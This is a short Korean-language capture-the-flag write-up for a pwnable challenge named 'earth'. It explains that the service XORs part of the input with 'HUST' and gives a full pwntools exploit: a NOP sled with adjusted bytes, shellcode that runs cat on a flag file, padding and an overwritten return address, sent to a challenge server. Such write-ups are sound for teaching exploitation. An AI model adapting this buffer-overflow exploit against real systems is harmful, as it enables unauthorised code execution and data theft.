## No.19 Pwnable earth[100]

**점수:** 100

**분야:** Pwnable

**제목:** earth

**Description:**

> Capture the flag!
> 
> nc 223.194.105.182 22900
> 
> Download : https://goo.gl/WLNg0r

주어진 서비스에 접속하면 취약한 바이너리와 직접 통신하고 있지 않는 것을 확인할 수 있다.

기본적인 nop sled + shellcode로 공격을 시도할 경우 자꾸 segfault가 발생하여 조사를 하던 중 

입력한 값의 8~12번째 값에 ‘HUST’로 XOR 연산 후 보내는 것을 확인하였다.

이를 고려하여 4바이트를 수정한 후 공격한다.

직접 쉘을 따는 쉘코드로는 통신이 불가하여 /home/earth/flag를 읽어주는 쉘코드를 이용했다.

```python
from pwn import *
 
r = remote('223.194.105.182', 22900)
 
r.recvuntil(']\n')
 
# '\x90\x90\x90\x90' ^ 'HUST' == '\xD8\xC5\xC3\xC4'
payload = '\x90' * 8 + '\xD8\xC5\xC3\xC4' + '\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x66\x6c\x61\x67\x68\x72\x74\x68\x2f\x68\x65\x2f\x65\x61\x68\x2f\x68\x6f\x6d\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80'
payload += '\x90' * (112 - len(payload))
payload += p32(0xbffff46c)
 
r.sendline(payload)
r.interactive()
```
